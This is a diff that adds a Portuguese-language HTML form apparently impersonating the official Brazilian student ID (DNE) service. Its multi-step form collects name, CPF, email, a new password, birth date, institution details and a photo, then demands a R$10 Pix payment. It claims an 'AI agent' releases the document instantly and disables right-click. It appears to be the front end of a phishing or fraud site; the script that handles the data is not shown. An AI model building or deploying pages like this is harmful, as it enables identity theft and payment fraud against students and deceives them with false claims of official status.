@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Preenchimento Oficial - DNE</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/jsbarcode@3.11.0/dist/JsBarcode.all.min.js"></script>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body oncontextmenu="return false;">
+
+    <header>
+        <div class="brand-header-group">
+            <a href="index.html" class="brand-logo-official">
+                <div class="logo-shield-icon"><i class="fa-solid fa-graduation-cap"></i></div>
+                <div>
+                    <div class="logo-title-bold">DNE<span>OFICIAL</span></div>
+                    <div class="logo-subtitle-official">Documento do Estudante</div>
+                </div>
+            </a>
+        </div>
+        <a href="index.html" class="btn-cta-header" style="background: #64748b;">
+            <i class="fa-solid fa-arrow-left"></i> Voltar ao Início
+        </a>
+    </header>
+
+    <!-- FORMULÁRIO MULTI-ETAPAS -->
+    <main class="section-padding" style="background: #f8fafc; min-height: 80vh;" id="main-form-container">
+        <div class="content-limit" style="max-width: 600px;">
+            <div class="modal-form-wrapper" style="margin: 0 auto; box-shadow: 0 10px 30px rgba(0,0,0,0.08);">
+                <h2 style="font-size: 22px; font-weight: 900; color: #0f172a; text-align: center;">Solicitação DNE Oficial</h2>
+                <p style="font-size: 12px; color: #16a34a; font-weight: 700; text-align: center; margin-top: 4px;">
+                    <i class="fa-solid fa-robot"></i> Liberação Instantânea via Agente de IA • Passo <span id="current-step-num">1</span> de 3
+                </p>
+
+                <div class="step-progress-bar">
+                    <div class="progress-line-active" id="progress-line"></div>
+                    <div class="step-indicator active" id="ind-1">1</div>
+                    <div class="step-indicator" id="ind-2">2</div>
+                    <div class="step-indicator" id="ind-3">3</div>
+                </div>
+
+                <form id="cie-form" onsubmit="iniciarPagamentoPix(event)">
+                    
+                    <!-- ETAPA 1 -->
+                    <div class="form-step active-step" id="step-1">
+                        <div class="form-grid">
+                            <div class="form-group">
+                                <label>Nome Completo</label>
+                                <input type="text" id="input-nome" placeholder="Conforme documento oficial" required minlength="5" oninput="validarEtapa1()">
+                            </div>
+                            <div class="form-group">
+                                <label>CPF</label>
+                                <input type="text" id="input-cpf" placeholder="000.000.000-00" maxlength="14" required oninput="mascaraCPF(this)">
+                                <span class="cpf-status-badge" id="cpf-ok">✓ VÁLIDO</span>
+                            </div>
+                            <div class="form-group">
+                                <label>E-mail (Para acesso e recuperação)</label>
+                                <input type="email" id="input-email" placeholder="seu-email@exemplo.com" required>
+                            </div>
+                            <div class="form-group">
+                                <label>Criar Senha de Acesso</label>
+                                <input type="password" id="input-senha" placeholder="Mínimo 6 caracteres" required minlength="6">
+                            </div>
+                            <div class="form-group">
+                                <label>Data de Nascimento</label>
+                                <input type="date" id="input-nasc" required max="2015-12-31" onchange="validarEtapa1()">
+                            </div>
+                        </div>
+                        <div class="step-nav-buttons">
+                            <button type="button" class="btn-step-next" id="btn-next-1" onclick="proximoPasso(2)" disabled>Próximo: Dados Acadêmicos →</button>
+                        </div>
+                    </div>
+
+                    <!-- ETAPA 2 -->
+                    <div class="form-step" id="step-2">
+                        <div class="form-grid">
+                            <div class="form-group" style="position:relative;">
+                                <label>Instituição de Ensino</label>
+                                <input type="text" id="input-inst" placeholder="Digite ex: USP, UFSC, Estácio..." autocomplete="off" oninput="autocompleteInst(this)">
+                                <div class="autocomplete-items" id="autocomplete-list"></div>
+                            </div>
+                            <div class="form-group">
+                                <label>Nº de Matrícula (RA)</label>
+                                <input type="text" id="input-matricula" placeholder="Registro acadêmico" required>
+                            </div>
+                            <div class="form-group">
+                                <label>Curso</label>
+                                <input type="text" id="input-curso" placeholder="Ex: Engenharia, Direito, Ensino Médio" required>
+                            </div>
+                            <div class="form-group">
+                                <label>Escolaridade</label>
+                                <select id="input-nivel" required>
+                                    <option value="EDUCAÇÃO BÁSICA">Educação Básica (Médio)</option>
+                                    <option value="TÉCNICO">Ensino Técnico</option>
+                                    <option value="GRADUAÇÃO" selected>Graduação (Superior)</option>
+                                    <option value="PÓS-GRADUAÇÃO">Pós-Graduação</option>
+                                </select>
+                            </div>
+                        </div>
+                        <div class="step-nav-buttons">
+                            <button type="button" class="btn-step-prev" onclick="proximoPasso(1)">Voltar</button>
+                            <button type="button" class="btn-step-next" onclick="proximoPasso(3)">Próximo: Foto 3x4 →</button>
+                        </div>
+                    </div>
+
+                    <!-- ETAPA 3 -->
+                    <div class="form-step" id="step-3">
+                        <div class="form-group">
+                            <label>Foto Oficial 3x4</label>
+                            <div class="photo-upload-box" onclick="document.getElementById('input-foto').click()">
+                                <img id="photo-preview-img" class="photo-preview-circle" src="" alt="Preview Foto">
+                                <span id="file-label-text">📸 Clique para carregar sua foto 3x4</span>
+                                <input type="file" id="input-foto" accept="image/jpeg, image/png" required onchange="previewImage(event)" style="display:none;">
+                            </div>
+                        </div>
+
+                        <div class="checkbox-group">
+                            <input type="checkbox" id="termos" required onchange="validarEtapa3()">
+                            <label for="termos">Declaro sob as penas da lei que os dados informados são autênticos para fins de emissão oficial.</label>
+                        </div>
+
+                        <div class="step-nav-buttons">
+                            <button type="button" class="btn-step-prev" onclick="proximoPasso(2)">Voltar</button>
+                            <button type="submit" class="btn-submit-form" id="btn-submit" disabled style="margin-top:0;">Pagar R$ 10,00 e Emitir</button>
+                        </div>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </main>
+
+    <!-- MODAL PIX -->
+    <div id="pix-modal">
+        <div class="modal-content-box">
+            <h3 style="font-size: 18px; font-weight: 900;">Pagamento via Pix (R$ 10,00)</h3>
+            <p style="font-size: 12px; color: #64748b;">Escaneie ou copie o código abaixo. O Agente de IA fará a liberação automática!</p>
+            <img id="pix-qrcode-img" class="pix-qr-code" src="" alt="QR Code Pix">
+            <input type="text" id="pix-copia-cola" class="pix-code-input" readonly>
+            <button class="btn-submit-form" style="background:#16a34a; margin-top:5px;" onclick="copiarPix()">Copiar Código Pix</button>
+            <div style="margin-top: 10px;">
+                <div class="spinner"></div>
+                <p style="font-size: 12px; font-weight: bold; color: #2563eb;" id="status-text-ia">
+                    🤖 Agente de IA aguardando confirmação bancária...
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <p>&copy; 2026 Documento Nacional do Estudante (DNE) — Em conformidade com a Lei 12.933/2013.</p>
+    </footer>
+
+    <script src="script.js"></script>
+</body>
+</html>
